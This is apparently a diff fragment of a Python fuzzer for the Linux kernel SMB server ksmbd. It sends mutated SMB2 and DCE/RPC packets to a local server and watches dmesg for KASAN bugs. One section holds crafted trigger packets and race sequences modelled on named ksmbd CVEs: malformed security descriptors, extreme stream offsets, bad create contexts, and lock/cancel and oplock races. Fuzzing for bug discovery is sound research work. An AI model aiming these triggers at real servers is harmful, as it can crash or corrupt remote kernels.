-        # Dynamic LOCK
-        for _ in range(4):
-            off = random.choice(pool_vals + tv) & 0xFFFFFFFFFFFFFFFF
-            length = random.choice(pool_vals + tv) & 0xFFFFFFFFFFFFFFFF
-            flags = random.choice([0x01, 0x02, 0x10, 0x20, 0x21, 0xFF])
-            body = struct.pack('<HI', 48, 1) + file_id + struct.pack('<qqII', off, length, flags, 0)
-            raw_pdu(0x000A, body, 'lock')
-
-        # Dynamic READ
-        for _ in range(4):
-            roff = random.choice(pool_vals + tv) & 0xFFFFFFFFFFFFFFFF
-            rlen = random.choice(pool_vals + [0xFFFFFFFF, 0, 1]) & 0xFFFFFFFF
-            body = struct.pack('<HBIQI', 49, 0, rlen, roff, 0) + file_id + struct.pack('<III', 0, 0, 0)
-            raw_pdu(0x0008, body, 'read')
-
-        # Dynamic WRITE with extreme values
-        for v in tv[:6]:
-            body = struct.pack('<HHI', 49, random.choice([0, 64, 113, 0xFFFF]) & 0xFFFF, random.choice(pool_vals) & 0xFFFFFFFF)
-            body += struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF) + file_id
-            body += struct.pack('<IIHHI', 0, 0, 0, 0, random.randint(0, 0xFFFFFFFF)) + b'\x00' + os.urandom(64)
-            raw_pdu(0x0009, body, 'write')
-
-        # CLOSE with stale/garbage FileId
-        for _ in range(3):
-            body = struct.pack('<HHI', 24, 0, 0) + os.urandom(16)
-            raw_pdu(0x0006, body, 'close')
-
-        # Coverage-guided bonus: send 5 more of the most productive PDU type
-        best = max(pdu_hits, key=pdu_hits.get) if any(pdu_hits.values()) else 'ioctl'
-        for _ in range(5):
-            v = random.choice(pool_vals + tv)
-            if best == 'ioctl':
-                payload = struct.pack('<qq', v, random.choice(pool_vals))
-                body = struct.pack('<HHI', 57, 0, 0x000980C8) + file_id
-                body += struct.pack('<IIIIIII', 120, len(payload), 0, 0, 0, 4096, 1) + struct.pack('<I', 0) + payload
-                raw_pdu(0x000B, body, 'ioctl')
-            elif best == 'querydir':
-                body = struct.pack('<HBBI', 33, random.randint(0,255), 0, 0) + file_id
-                body += struct.pack('<HHI', 96, 2, v & 0xFFFFFFFF) + b'*\x00'
-                raw_pdu(0x000E, body, 'querydir')
-            elif best == 'lock':
-                body = struct.pack('<HI', 48, 1) + file_id + struct.pack('<qqII', v, v, 0x21, 0)
-                raw_pdu(0x000A, body, 'lock')
-            else:
-                body = struct.pack('<HHI', 49, 113, v & 0xFFFFFFFF) + struct.pack('<Q', v) + file_id
-                body += struct.pack('<IIHHI', 0, 0, 0, 0, 0) + b'\x00' + os.urandom(64)
-                raw_pdu(0x0009, body, 'write')
-
-        sock.close()
-    except Exception:
-        pass
-
-    # Phase 4: TRUE parallel raw TCP races (no smbprotocol serialization)
-    try:
-        # smb_proto merged below
-        import sys; sys.path.insert(0, str(SCRIPT_DIR))
-
-        df.enable()
-        parallel_session_race(n_conns=4, target_file=f'fuzz_race_{worker_id}')
-        df.disable()
-        feat = df.features_fast()
-        new = feat - all_features
-        if new:
-            all_features.update(new)
-            raw_transitions += len(new)
-    except Exception:
-        # Fallback: use threading with smbprotocol
-        try:
-            import threading, uuid
-            from smbprotocol.connection import Connection, Dialects
-            from smbprotocol.session import Session
-            from smbprotocol.tree import TreeConnect
-            from smbprotocol.open import Open, CreateDisposition, ShareAccess, CreateOptions
-
-            race_file = f"fuzz_race_{worker_id}"
-            def make_session():
-                c = Connection(uuid.uuid4(), "127.0.0.1", 445)
-                c.connect(dialect=Dialects.SMB_3_1_1)
-                s = Session(c, "fuzz", "fuzz", require_encryption=True)
-                s.connect()
-                t = TreeConnect(s, "\\\\127.0.0.1\\share")
-                t.connect()
-                o = Open(t, race_file)
-                o.create(0, 0x12019F, 0x80,
-                         ShareAccess.FILE_SHARE_READ|ShareAccess.FILE_SHARE_WRITE|ShareAccess.FILE_SHARE_DELETE,
-                         CreateDisposition.FILE_OPEN_IF, CreateOptions.FILE_NON_DIRECTORY_FILE)
-                return c, s, t, o
-
-            c1, s1, t1, o1 = make_session()
-            c2, s2, t2, o2 = make_session()
-            for burst in range(3):
-                df.enable()
-                def b1():
-                    for _ in range(5):
-                        try: o1.write(os.urandom(4096), offset=random.randint(0, 0xFFFF))
-                        except: pass
-                def b2():
-                    for _ in range(5):
-                        try: o2.write(os.urandom(4096), offset=random.randint(0, 0xFFFF))
-                        except: pass
-                ta = threading.Thread(target=b1); tb = threading.Thread(target=b2)
-                ta.start(); tb.start(); ta.join(); tb.join()
-                df.disable()
-                feat = df.features_fast()
-                new = feat - all_features
-                if new: all_features.update(new); raw_transitions += len(new)
-            try: o1.close(); t1.disconnect(); s1.disconnect(); c1.disconnect()
-            except: pass
-            try: o2.close(); t2.disconnect(); s2.disconnect(); c2.disconnect()
-            except: pass
-        except: pass
-
-    # Phase 5: CVE-pattern targeted attacks
-    try:
-        import threading, uuid
-        from smbprotocol.connection import Connection, Dialects
-        from smbprotocol.session import Session
-        from smbprotocol.tree import TreeConnect
-        from smbprotocol.open import Open, CreateDisposition, ShareAccess, CreateOptions
-
-        def _make_conn():
-            c = Connection(uuid.uuid4(), "127.0.0.1", 445)
-            c.connect(dialect=Dialects.SMB_3_1_1)
-            return c
-
-        # 5a. Session setup/teardown race (CVE-2024-50286 pattern)
-        # Rapid concurrent session create + disconnect triggers UAF in sessions_table
-        def rapid_session_churn():
-            for _ in range(10):
-                try:
-                    c = _make_conn()
-                    s = Session(c, "fuzz", "fuzz", require_encryption=True)
-                    s.connect()
-                    s.disconnect()
-                    c.disconnect()
-                except: pass
-
-        df.enable()
-        threads = [threading.Thread(target=rapid_session_churn) for _ in range(3)]
-        for t in threads: t.start()
-        for t in threads: t.join()
-        df.disable()
-        feat = df.features_fast()
-        new = feat - all_features
-        if new:
-            all_features.update(new)
-            raw_transitions += len(new)
-
-        # 5b. Malformed SecurityDescriptor / ACL (CVE-2025-22039 pattern)
-        # SET_INFO with InfoType=3 (SECURITY) + crafted DACL with overflow offsets
-        conn = _make_conn()
-        sess = Session(conn, "fuzz", "fuzz", require_encryption=True)
-        sess.connect()
-        tree = TreeConnect(sess, "\\\\127.0.0.1\\share")
-        tree.connect()
-        f = Open(tree, f"fuzz_acl_{worker_id}")
-        f.create(0, 0x12019F, 0x80,
-                 ShareAccess.FILE_SHARE_READ|ShareAccess.FILE_SHARE_WRITE|ShareAccess.FILE_SHARE_DELETE,
-                 CreateDisposition.FILE_OPEN_IF, CreateOptions.FILE_NON_DIRECTORY_FILE)
-        file_id = f.file_id
-        sid, tid = sess.session_id, tree.tree_connect_id
-        mid = conn.sequence_window['low'] + 200
-        sock = conn.transport._sock
-        conn.transport._sock = None
-        conn.transport.connected = False
-
-        # SET_INFO InfoType=3 (SECURITY), with malformed SD
-        malformed_sds = [
-            # dacloffset=0xFFFFFFFF (CVE-2025-22039 overflow)
-            struct.pack('<BBHI', 0, 0, 0x0001, 0x78) + struct.pack('<I', 0) +
-            struct.pack('<I', 0x10000) + struct.pack('<I', 0xFFFFFFFF) +
-            b'\x00' * 100 + b'\x01\x01\x00\x00\x00\x00\x00\x00' + b'\xCC' * 64,
-            # dacloffset past buffer end
-            struct.pack('<BBHI', 0, 0, 0x0004, 0) + struct.pack('<III', 0, 0, 200) + b'\x00' * 32,
-            # num_subauth=0 (CVE-2025-22038: sub_auth[-1])
-            struct.pack('<BBHI', 1, 0, 0x0004, 0x14) + struct.pack('<III', 0, 0x14, 0) +
-            b'\x01' + b'\x00' + b'\x00' * 6 + b'\x00' * 60,  # SID with num_subauth=0
-            # Huge AclSize in DACL header
-            struct.pack('<BBHI', 0, 0, 0x0004, 0x14) + struct.pack('<III', 0, 0x14, 0) +
-            struct.pack('<BBHI', 2, 0, 0xFFFF, 1) + b'\x00' * 100,
-        ]
-        for sd in malformed_sds:
-            # SET_INFO: InfoType=3(security), FileInfoClass=0, AdditionalInfo=7(DACL|OWNER|GROUP)
-            hdr = _smb2_hdr(0x0011, mid, tid, sid); mid += 1
-            body = struct.pack('<H', 33)
-            body += struct.pack('<BB', 3, 0)  # InfoType=SECURITY, FileInfoClass=0
-            body += struct.pack('<I', len(sd))
-            body += struct.pack('<H', 96)
-            body += struct.pack('<H', 0)
-            body += struct.pack('<I', 7)  # AdditionalInfo = DACL|OWNER|GROUP
-            body += file_id
-            body += sd
-            df.enable(); _raw_send(sock, hdr + body); df.disable()
-            feat = df.features_fast()
-            new = feat - all_features
-            if new:
-                all_features.update(new)
-                raw_transitions += len(new)
-
-        # 5c. Stream write with extreme pos (CVE-2025-37947 pattern)
-        # Write to stream with pos >= XATTR_SIZE_MAX (0x10000)
-        stream_name = f"fuzz_stream_{worker_id}:stream1"
-        for stream_pos in [0x10000, 0x10008, 0x10010, 0x10100, 0xFFFF]:
-            hdr = _smb2_hdr(0x0009, mid, tid, sid); mid += 1  # WRITE
-            body = struct.pack('<HHI', 49, 113, 64)  # StructSize, DataOffset, Length=64
-            body += struct.pack('<Q', stream_pos)  # Offset = extreme pos
-            body += file_id
-            body += struct.pack('<IIHHI', 0, 0, 0, 0, 0)
-            body += b'\x00' + b'\xAA' * 64
-            df.enable(); _raw_send(sock, hdr + body); df.disable()
-            feat = df.features_fast()
-            new = feat - all_features
-            if new:
-                all_features.update(new)
-                raw_transitions += len(new)
-
-        # 5d. CREATE with malformed contexts (CVE-2025-22042/22043 pattern)
-        # DH2Q context with truncated buffer / Lease context with bad LeaseState
-        for ctx_data in [
-            # Malformed DH2Q (durable handle v2) — truncated
-            b'\x00' * 4 + struct.pack('<I', 32) + b'DH2Q' + b'\x00' * 4 + b'\xFF' * 8,
-            # Malformed lease context — huge LeaseState
-            b'\x00' * 4 + struct.pack('<I', 52) + b'RqLs' + b'\x00' * 4 +
-            os.urandom(16) + struct.pack('<III', 0xFFFFFFFF, 0xFFFFFFFF, 0) + b'\x00' * 16,
-            # MxAc context (max access) with garbage
-            b'\x00' * 4 + struct.pack('<I', 4) + b'MxAc' + b'\x00' * 4 + b'\xFF' * 100,
-        ]:
-            hdr = _smb2_hdr(0x0005, mid, tid, sid); mid += 1  # CREATE
-            fname = f"fuzz_ctx_{worker_id}".encode('utf-16-le')
-            creat_body = struct.pack('<H', 57)
-            creat_body += struct.pack('<BB', 0, 0)
-            creat_body += struct.pack('<I', 0)
-            creat_body += struct.pack('<QQ', 0, 0)
-            creat_body += struct.pack('<I', 0x12019F)
-            creat_body += struct.pack('<I', 0x80)
-            creat_body += struct.pack('<I', 0x07)
-            creat_body += struct.pack('<I', 0x05)
-            creat_body += struct.pack('<I', 0x40)
-            name_offset = 120
-            ctx_offset = name_offset + len(fname)
-            # Align to 8
-            ctx_offset = (ctx_offset + 7) & ~7
-            creat_body += struct.pack('<HH', name_offset, len(fname))
-            creat_body += struct.pack('<II', ctx_offset, len(ctx_data))
-            creat_body += fname
-            # Pad to ctx_offset
-            pad = ctx_offset - name_offset - len(fname)
-            if pad > 0: creat_body += b'\x00' * pad
-            creat_body += ctx_data
-            df.enable(); _raw_send(sock, hdr + creat_body); df.disable()
-            feat = df.features_fast()
-            new = feat - all_features
-            if new:
-                all_features.update(new)
-                raw_transitions += len(new)
-
-        # 5e. Oplock break race (CVE-2025-37776 pattern)
-        # Open file with oplock on one session, disconnect during break
-        try:
-            c3 = _make_conn()
-            s3 = Session(c3, "fuzz", "fuzz", require_encryption=True)
-            s3.connect()
-            t3 = TreeConnect(s3, "\\\\127.0.0.1\\share")
-            t3.connect()
-            o3 = Open(t3, f"fuzz_oplock_{worker_id}")
-            # Request exclusive oplock
-            o3.create(0, 0x12019F, 0x80,
-                     ShareAccess.FILE_SHARE_READ|ShareAccess.FILE_SHARE_WRITE|ShareAccess.FILE_SHARE_DELETE,
-                     CreateDisposition.FILE_OPEN_IF, CreateOptions.FILE_NON_DIRECTORY_FILE,
-                     oplock_level=0x08)  # SMB2_OPLOCK_LEVEL_BATCH
-            # Open same file from another session to trigger oplock break
-            c4 = _make_conn()
-            s4 = Session(c4, "fuzz", "fuzz", require_encryption=True)
-            s4.connect()
-            t4 = TreeConnect(s4, "\\\\127.0.0.1\\share")
-            t4.connect()
-            # Disconnect first session while oplock break is in flight
-            def open_and_disconnect():
-                try:
-                    o4 = Open(t4, f"fuzz_oplock_{worker_id}")
-                    o4.create(0, 0x12019F, 0x80,
-                             ShareAccess.FILE_SHARE_READ|ShareAccess.FILE_SHARE_WRITE|ShareAccess.FILE_SHARE_DELETE,
-                             CreateDisposition.FILE_OPEN_IF, CreateOptions.FILE_NON_DIRECTORY_FILE)
-                except: pass
-            def disconnect_first():
-                import time; time.sleep(0.001)
-                try: c3.disconnect()
-                except: pass
-
-            df.enable()
-            ta = threading.Thread(target=open_and_disconnect)
-            tb = threading.Thread(target=disconnect_first)
-            ta.start(); tb.start(); ta.join(); tb.join()
-            df.disable()
-            feat = df.features_fast()
-            new = feat - all_features
-            if new:
-                all_features.update(new)
-                raw_transitions += len(new)
-            try: c4.disconnect()
-            except: pass
-        except: pass
-
-        # 5f. LOCK→CLOSE→CANCEL race (deferred lock UAF pattern)
-        # Triggers stale cancel_fn on async_requests after lock freed
-        try:
-            c5 = _make_conn()
-            s5 = Session(c5, "fuzz", "fuzz", require_encryption=True)
-            s5.connect()
-            t5 = TreeConnect(s5, "\\\\127.0.0.1\\share")
-            t5.connect()
-            o5 = Open(t5, f"fuzz_lockcancel_{worker_id}")
-            o5.create(0, 0x12019F, 0x80,
-                     ShareAccess.FILE_SHARE_READ|ShareAccess.FILE_SHARE_WRITE|ShareAccess.FILE_SHARE_DELETE,
-                     CreateDisposition.FILE_OPEN_IF, CreateOptions.FILE_NON_DIRECTORY_FILE)
-            fid5 = o5.file_id
-            sid5, tid5 = s5.session_id, t5.tree_connect_id
-            mid5 = c5.sequence_window['low'] + 300
-            sock5 = c5.transport._sock
-            c5.transport._sock = None
-            c5.transport.connected = False
-
-            # Send LOCK request (will be deferred if range conflicts)
-            lock_body = struct.pack('<HI', 48, 1) + fid5
-            lock_body += struct.pack('<qqII', 0, 0x7FFFFFFF, 0x01, 0)  # exclusive
-            hdr = _smb2_hdr(0x000A, mid5, tid5, sid5); mid5 += 1
-            df.enable(); _raw_send(sock5, hdr + lock_body); df.disable()
-
-            # Send CLOSE immediately (frees the file_lock)
-            close_body = struct.pack('<HHI', 24, 0, 0) + fid5
-            hdr = _smb2_hdr(0x0006, mid5, tid5, sid5); mid5 += 1
-            df.enable(); _raw_send(sock5, hdr + close_body); df.disable()
-
-            # Send CANCEL (fires cancel_fn on potentially freed lock)
-            # CANCEL uses the MessageId of the LOCK request
-            cancel_hdr = _smb2_hdr(0x000C, mid5 - 2, tid5, sid5)
-            df.enable(); _raw_send(sock5, cancel_hdr); df.disable()
-            feat = df.features_fast()
-            new = feat - all_features
-            if new:
-                all_features.update(new)
-                raw_transitions += len(new)
-            sock5.close()
-        except: pass
-
-        # 5g. Concurrent overlapping LOCK race (list_del corruption pattern)
-        try:
-            c6 = _make_conn()
-            s6 = Session(c6, "fuzz", "fuzz", require_encryption=True)
-            s6.connect()
-            t6 = TreeConnect(s6, "\\\\127.0.0.1\\share")
-            t6.connect()
-            o6 = Open(t6, f"fuzz_lockrace_{worker_id}")
-            o6.create(0, 0x12019F, 0x80,
-                     ShareAccess.FILE_SHARE_READ|ShareAccess.FILE_SHARE_WRITE|ShareAccess.FILE_SHARE_DELETE,
-                     CreateDisposition.FILE_OPEN_IF, CreateOptions.FILE_NON_DIRECTORY_FILE)
-            fid6 = o6.file_id
-            sid6, tid6 = s6.session_id, t6.tree_connect_id
-            mid6 = c6.sequence_window['low'] + 400
-            sock6 = c6.transport._sock
-            c6.transport._sock = None
-            c6.transport.connected = False
-
-            # Rapidly lock + unlock overlapping ranges
-            df.enable()
-            for _ in range(10):
-                off = random.randint(0, 0xFFFF)
-                length = random.randint(1, 0xFFFF)
-                # LOCK exclusive
-                body = struct.pack('<HI', 48, 1) + fid6 + struct.pack('<qqII', off, length, 0x01, 0)
-                hdr = _smb2_hdr(0x000A, mid6, tid6, sid6); mid6 += 1
-                _raw_send(sock6, hdr + body)
-                # UNLOCK same range
-                body = struct.pack('<HI', 48, 1) + fid6 + struct.pack('<qqII', off, length, 0x20, 0)
-                hdr = _smb2_hdr(0x000A, mid6, tid6, sid6); mid6 += 1
-                _raw_send(sock6, hdr + body)
-            df.disable()
-            feat = df.features_fast()
-            new = feat - all_features
-            if new:
-                all_features.update(new)
-                raw_transitions += len(new)
-            sock6.close()
-        except: pass
-
-        # 5h. WRITE with RDMA ChannelInfoLength mismatch (OOB read pattern)
-        # Send WRITE with Channel=RDMA but ChannelInfoLength > actual data
-        try:
-            for ch_len in [0x100, 0x1000, 0xFFFF]:
-                hdr = _smb2_hdr(0x0009, mid, tid, sid); mid += 1
-                body = struct.pack('<HHI', 49, 113, 64)  # StructSize, DataOffset, Length
-                body += struct.pack('<Q', 0) + file_id   # Offset + FileId
-                body += struct.pack('<I', 1)             # Channel = RDMA_V1
-                body += struct.pack('<I', 0)             # RemainingBytes
-                body += struct.pack('<HH', 120, ch_len)  # WriteChannelInfoOffset, ChannelInfoLength
-                body += struct.pack('<I', 0)             # Flags
-                body += b'\x00' + b'\xBB' * 64           # Minimal data (shorter than ChannelInfoLength)
-                df.enable(); _raw_send(sock, hdr + body); df.disable()
-                feat = df.features_fast()
-                new = feat - all_features
-                if new:
-                    all_features.update(new)
-                    raw_transitions += len(new)
-        except: pass
-
-        sock.close()
-    except Exception:
-        pass
-
-    # Phase 5b: NDR/DCE-RPC fuzzing over IPC$ pipe (exercises ndr.c parsing)
-    try:
-        # smb_proto merged below
-        ndr_conn = RawSmb2()
-        ndr_conn.connect()
-        ndr_conn.negotiate()
-        ndr_conn.session_setup_ntlmssp()
-        # Tree connect to IPC$
-        path = '\\\\127.0.0.1\\IPC$'.encode('utf-16-le')
-        hdr = smb2_hdr(0x0003, ndr_conn.mid, sid=ndr_conn.sid); ndr_conn.mid += 1
-        body = struct.pack('<HHHH', 9, 0, 72, len(path)) + path
-        resp = ndr_conn._xact(hdr + body)
-        if resp and len(resp) >= 40:
-            ndr_conn.tid = struct.unpack_from('<I', resp, 36)[0]
-            # Create pipe: \srvsvc
-            pipe_name = '\\srvsvc'.encode('utf-16-le')
-            hdr = smb2_hdr(0x0005, ndr_conn.mid, ndr_conn.tid, ndr_conn.sid); ndr_conn.mid += 1
-            body = struct.pack('<HBB', 57, 0, 0) + struct.pack('<I', 0) + struct.pack('<QQ', 0, 0)
-            body += struct.pack('<IIII', 0x12019F, 0, 0x07, 0x01)
-            body += struct.pack('<I', 0x00200000)
-            body += struct.pack('<HH', 120, len(pipe_name))
-            body += struct.pack('<II', 0, 0)
-            body += pipe_name
-            resp = ndr_conn._xact(hdr + body)
-            if resp and len(resp) >= 144:
-                pipe_fid = resp[128:144]
-                # Send mutated DCE/RPC bind + request over the pipe via IOCTL/FSCTL_PIPE_TRANSCEIVE
-                df.enable()
-                for _ in range(20):
-                    # DCE/RPC header: version(1)=5, minor(1)=0, type(1)=0(request), flags(1)
-                    rpc = bytearray(24)
-                    rpc[0] = 5; rpc[1] = 0
-                    rpc[2] = random.choice([0, 11, 12, 14])  # request/bind/alter_ctx/orphaned
-                    rpc[3] = random.randint(0, 0xFF)
-                    rpc[4:8] = b'\x10\x00\x00\x00'  # data representation
-                    # Frag length (mutated)
-                    frag_len = random.randint(24, 256)
-                    struct.pack_into('<H', rpc, 8, frag_len)
-                    # Call ID
-                    struct.pack_into('<I', rpc, 12, random.randint(0, 0xFFFF))
-                    # Mutated payload
-                    rpc += os.urandom(random.randint(8, 200))
-
-                    # IOCTL(FSCTL_PIPE_TRANSCEIVE=0x0011C017) with pipe_fid
-                    hdr = smb2_hdr(CMD_IOCTL, ndr_conn.mid, ndr_conn.tid, ndr_conn.sid)
-                    ndr_conn.mid += 1
-                    ioctl_body = struct.pack('<HH', 57, 0)
-                    ioctl_body += struct.pack('<I', 0x0011C017)  # FSCTL_PIPE_TRANSCEIVE
-                    ioctl_body += pipe_fid
-                    ioctl_body += struct.pack('<II', 120, len(rpc))  # input offset, count
-                    ioctl_body += struct.pack('<I', 4096)  # max input
-                    ioctl_body += struct.pack('<II', 0, 0)  # output offset/count
-                    ioctl_body += struct.pack('<I', 4096)  # max output
-                    ioctl_body += struct.pack('<I', 1)  # flags = SMB2_0_IOCTL_IS_FSCTL
-                    ioctl_body += struct.pack('<I', 0)  # reserved
-                    ioctl_body += bytes(rpc)
-                    ndr_conn._send(hdr + ioctl_body)
-                df.disable()
-                feat = df.features_fast()
-                new = feat - all_features
-                if new:
-                    all_features.update(new)
-                    raw_transitions += len(new)
-        ndr_conn.disconnect()
-    except Exception:
-        pass
-
-    # Check bugs (only after KSMBD starts — filter boot-time warnings)
-    bugs = os.popen("dmesg | tail -200 | grep -cE 'BUG:.*ksmbd|BUG:.*smb|UBSAN:.*smb|UBSAN:.*ksmbd|possible circular.*ksmbd|sleeping.*atomic.*ksmbd' 2>/dev/null").read().strip()
-    # Also check generic KASAN (any slab-out-of-bounds after init)
-    kasan = os.popen("dmesg | tail -200 | grep -c 'BUG: KASAN' 2>/dev/null").read().strip()
-    bug_count = (int(bugs) if bugs.isdigit() else 0) + (int(kasan) if kasan.isdigit() else 0)
-
-    return (len(all_features), transitions, raw_transitions, bug_count,
-            [(off, data.hex(), rank) for off, data, rank in corpus[:256]],
-            list(all_features)[:10000], new_values[:500])
-
-# ─── Fuzz Command ─────────────────────────────────────────────────────────────
-
-def _seed_audit_corpus():
-    """Seed sniper persistent corpus with exact audit boundary values."""
-    corpus_dir = Path('/tmp/ksmbdzzer_corpus_persistent')
-    corpus_dir.mkdir(exist_ok=True)
-    seeds = {
-        'sniper_raw_write': [
-            # #3: loff_t overflow offsets
-            struct.pack('<QI', 0x7FFFFFFFFFFFFFF0, 32),
-            struct.pack('<QI', 0x7FFFFFFFFFFFFFFE, 16),
-            struct.pack('<QI', 0x7FFFFFFFFFFFF000, 4096),
-        ],
-        'sniper_compound': [
-            # #1: DataOffset OOB (bit 0x20 set + large offset byte)
-            b'\x20\xff' + struct.pack('<I', 0x1000) + b'A' * 64,
-            # #2: AllocationSize overflow (bit 0x40 set + index)
-            b'\x40\x00' + struct.pack('<I', 0) + b'B' * 64,
-            b'\x40\x01' + struct.pack('<I', 0) + b'C' * 64,
-        ],
-        'sniper_dacl_setinfo': [
-            # #4: BufferOffset OOB (bit 0x10 set + large offset)
-            b'\x10\x3f' + b'\x00' * 18 + b'\x02\x00\x01\x00' + b'D' * 200,
-            # #5: DENY ACE with MAXIMAL_ACCESS
-            b'\x00\x00' + b'\x00' * 2 + b'\x01\x00' + b'\x01\x05' + struct.pack('<I', 0x02000000) + b'E' * 100,
-        ],
-    }
-    for sniper_name, seed_list in seeds.items():
-        d = corpus_dir / sniper_name
-        d.mkdir(exist_ok=True)
-        for i, data in enumerate(seed_list):
-            f = d / f'audit_seed_{i:02d}'
-            if not f.exists():
-                f.write_bytes(data)
-
-
-@dataclass
-class FuzzCampaign:
-    """Orchestrates multi-round fuzzing campaigns.
-    
-    Encapsulates state that persists across rounds:
-    corpus, features, value pool, peak metrics, history.
-    """
-    cfg: Config = field(default_factory=lambda: CFG)
-    service: KsmbdService = field(default_factory=KsmbdService)
-    seed_corpus: list = field(default_factory=list)
-    global_features: set = field(default_factory=set)
-    value_pool: list = field(default_factory=list)
-    history: list = field(default_factory=list)
-    peak_feat: int = 0
-
-    def load_corpus(self) -> None:
-        self.seed_corpus, self.global_features, self.value_pool = corpus_load()
-        if self.seed_corpus:
-            print(f"  Loaded corpus: {len(self.seed_corpus)} entries, "
-                  f"{len(self.global_features)} features, {len(self.value_pool)} pool values")
-
-    def save_corpus(self) -> None:
-        corpus_save(self.seed_corpus, self.global_features, self.value_pool)
-
-    def check_recovery(self, round_feat: int) -> None:
-        """Restart ksmbd if features dropped >50% from peak."""
-        self.peak_feat = max(self.peak_feat, round_feat)
-        if round_feat < self.peak_feat * 0.5 or round_feat == 0:
-            print(f"  [recovery] Features dropped ({round_feat} < {self.peak_feat}×50%), restarting ksmbd...")
-            self.service.restart_and_remount()
-            time.sleep(2)
-
-    def record_round(self, elapsed: float, cum_features: int, corpus_size: int, rnd: int) -> None:
-        self.history.append((elapsed, cum_features, corpus_size, rnd))
-
-    def print_histogram(self) -> None:
-        if not self.history: return
-        print(f"\n  Coverage & Corpus over Time")
-        print(f"  {'─'*56}")
-        max_feat = max(h[1] for h in self.history) or 1
-        width = 40
-        for elapsed_s, cum_feat, corpus_sz, _ in self.history:
-            t_min = elapsed_s / 60
-            feat_bar = int((cum_feat / max_feat) * width)
-            print(f"  {t_min:5.1f}m │{'█' * feat_bar}{'░' * (width - feat_bar)}│ {cum_feat:>7} feat")
-            print(f"       │{'▓' * (corpus_sz * width // 600)}{' ' * (width - corpus_sz * width // 600)}│ {corpus_sz:>5} corpus")
-        print(f"  {'─'*56}")
-        print(f"  █ = cumulative features  ▓ = corpus size")
-        report_path = Path('/tmp/ksmbdzzer_report.csv')
-        with open(report_path, 'w') as f:
-            f.write("elapsed_sec,cumulative_features,corpus_size,round\n")
-            for h in self.history:
-                f.write(f"{h[0]:.1f},{h[1]},{h[2]},{h[3]}\n")
-        print(f"  CSV: {report_path}")
-
-
-# Global campaign instance (used by cmd_fuzz/cmd_validate)
-_campaign = FuzzCampaign()
-
-
-def cmd_fuzz(args):
-    rounds, procs = args.rounds, args.procs
-
-    # Pre-flight: verify CIFS mount is alive, recover if not
-    try:
-        Path(f'{MOUNT}/fuzz_target').write_bytes(b'x')
-    except OSError:
-        print("  [recovery] CIFS mount dead at start, recovering...")
-        _remount_cifs()
-
-    # Parse timeout (-t 30m, 1h, 90s, etc.)
-    deadline = None
-    timeout_str = getattr(args, 't', None)
-    if timeout_str:
-        val = timeout_str.strip()
-        if val.endswith('h'): deadline = time.time() + float(val[:-1]) * 3600
-        elif val.endswith('m'): deadline = time.time() + float(val[:-1]) * 60
-        elif val.endswith('s'): deadline = time.time() + float(val[:-1])
-        else: deadline = time.time() + float(val)
-        rounds = 99999  # run until timeout
-
-    print(f"=== ksmbdzzer — KSMBD Dataflow-Guided Fuzzer ===")
-    print(f"Rounds: {rounds}, Workers: {procs}, Corpus: {CORPUS_DB}")
-    if deadline:
-        print(f"Timeout: {timeout_str} (deadline in {deadline - time.time():.0f}s)")
-    print()
-
-    # Load persistent corpus
-    _campaign.load_corpus()
-    seed_corpus = _campaign.seed_corpus
-    global_features = _campaign.global_features
-    global_vpool = _campaign.value_pool
-
-    mgr = None
-    shared_vpool = global_vpool[:4096]  # plain list (no Manager — stable for long runs)
-
-    t0 = time.time()
-    total_feat = total_trans = total_raw = 0
-
-    for rnd in range(1, rounds + 1):
-        print(f"--- Round {rnd}/{rounds} ---")
-
-        # Timeout check: save corpus and exit gracefully
-        if deadline and time.time() >= deadline:
-            print(f"  [timeout] Reached deadline, saving corpus and exiting...")
-            corpus_save(seed_corpus, global_features, list(shared_vpool))
-            break
-
-        # Toggle FAILSLAB: even rounds = injection ON (prob=20), odd = OFF
-        if rnd % 2 == 0:
-            os.system("echo 20 > /sys/kernel/debug/failslab/probability 2>/dev/null")
-            os.system("echo 2 > /sys/kernel/debug/failslab/interval 2>/dev/null")
-        else:
-            os.system("echo 0 > /sys/kernel/debug/failslab/probability 2>/dev/null")
-
-        # Prepare seed for workers
-        seed_c = [(off, bytes.fromhex(d), r) for off, d, r in seed_corpus[:256]]
-        seed_f = list(global_features)[:20000]
-
-        if procs > 1:
-            with multiprocessing.Pool(procs) as pool:
-                results = pool.map(run_one_cycle,
-                    [(w, shared_vpool, seed_c, seed_f) for w in range(procs)])
-        else:
-            results = [run_one_cycle((0, shared_vpool, seed_c, seed_f))]
-
-        # Merge results
-        round_feat = round_trans = round_raw = 0
-        for feat, trans, raw_t, bugs, new_corpus, new_feats, new_vals in results:
-            round_feat += feat
-            round_trans += trans
-            round_raw += raw_t
-            global_features.update(new_feats)
-            shared_vpool.extend(new_vals[:200])
-            if len(shared_vpool) > 4096:
-                shared_vpool = shared_vpool[-4096:]
-            # Merge corpus
-            for off, dhex, rank in new_corpus:
-                seed_corpus.append((off, dhex, rank))
-            if bugs > 0:
-                print(f"  !!! BUG DETECTED !!!")
-                os.system("dmesg | tail -100 | grep -B1 -A15 'KASAN\\|ksmbd\\|smb2' | head -40")
-                # Export crash reproducer
-                from sniper import CRASH_DIR
-                import shutil
-                CRASH_DIR.mkdir(exist_ok=True)
-                crash_dir = CRASH_DIR / f'worker_bug_{int(time.time())}'
-                crash_dir.mkdir(exist_ok=True)
-                dmesg_out = subprocess.run(['dmesg'], capture_output=True, text=True, timeout=5)
-                (crash_dir / 'dmesg.txt').write_text(dmesg_out.stdout[-5000:])
-                (crash_dir / 'corpus.json').write_text(json.dumps(
-                    [{'offset': o, 'data': d, 'rank': r} for o, d, r in seed_corpus[:64]]))
-                print(f"  Crash exported → {crash_dir}")
-                corpus_save(seed_corpus, global_features, list(shared_vpool))
-                print(f"\n=== BUG FOUND in {time.time()-t0:.0f}s ===")
+            return
+        for i in range(got):
+            v = int(self._retbuf[i * 2 + 1]) & 0xFFFFFFFFFFFFFFFF
+            if v <= 1 or v >= 0xffff000000000000:
+                continue
+            self._ret_acc.add(v)
+            if len(self._ret_acc) > 4096:            # bound the working set
                 return
 
-        # Shrink corpus to top 512
-        seed_corpus.sort(key=lambda x: x[2], reverse=True)
-        seed_corpus = seed_corpus[:512]
-
-        # Recovery: if features dropped >50% from peak or zero, restart ksmbd
-        _campaign.check_recovery(round_feat)
-
-        total_feat += round_feat
-        total_trans += round_trans
-        total_raw += round_raw
-        print(f"  features={round_feat} transitions={round_trans} raw_pdu={round_raw} "
-              f"corpus={len(seed_corpus)} pool={len(shared_vpool)}")
